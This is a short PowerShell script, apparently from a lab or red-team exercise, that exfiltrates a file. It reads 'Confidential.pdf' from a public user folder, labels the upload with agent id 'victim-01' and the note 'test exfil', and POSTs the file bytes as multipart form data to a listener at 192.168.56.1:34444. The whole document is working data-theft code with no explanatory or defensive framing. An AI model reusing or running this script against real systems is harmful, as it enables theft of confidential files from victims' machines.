# ===============================
# FILE UPLOAD (PS 5.1 COMPATIBLE)
# ===============================

$FilePath = "C:\Users\Public\data\Confidential.pdf"
$AgentId  = "victim-01"
$Note     = "test exfil"

$Boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

# ---- BODY (TEXT PARTS) ----
$body = ""
$body += "--$Boundary$LF"
$body += "Content-Disposition: form-data; name=`"agent_id`"$LF$LF"
$body += "$AgentId$LF"

$body += "--$Boundary$LF"
$body += "Content-Disposition: form-data; name=`"note`"$LF$LF"
$body += "$Note$LF"

# ---- FILE HEADER ----
$FileName = [System.IO.Path]::GetFileName($FilePath)
$body += "--$Boundary$LF"
$body += "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"$LF"
$body += "Content-Type: application/octet-stream$LF$LF"

# convert header to bytes
$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)

# file bytes
$fileBytes = [System.IO.File]::ReadAllBytes($FilePath)

# ---- TRAILER ----
$trailer = "$LF--$Boundary--$LF"
$trailerBytes = [System.Text.Encoding]::UTF8.GetBytes($trailer)

# FULL BODY STREAM
$fullStream = New-Object System.IO.MemoryStream
$fullStream.Write($bodyBytes, 0, $bodyBytes.Length)
$fullStream.Write($fileBytes, 0, $fileBytes.Length)
$fullStream.Write($trailerBytes, 0, $trailerBytes.Length)

# ---- SEND REQUEST ----
$URL = "http://192.168.56.1:34444/upload"
$req = [System.Net.HttpWebRequest]::Create($URL)
$req.Method = "POST"
$req.ContentType = "multipart/form-data; boundary=$Boundary"
$req.ContentLength = $fullStream.Length

$stream = $req.GetRequestStream()
$fullStream.WriteTo($stream)
$stream.Close()

# ---- RESPONSE ----
try {
    $resp = $req.GetResponse()
    $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
    $respText = $reader.ReadToEnd()
    Write-Host $respText
}
catch {
    Write-Host "[Upload Error] $($_.Exception.Message)"
}
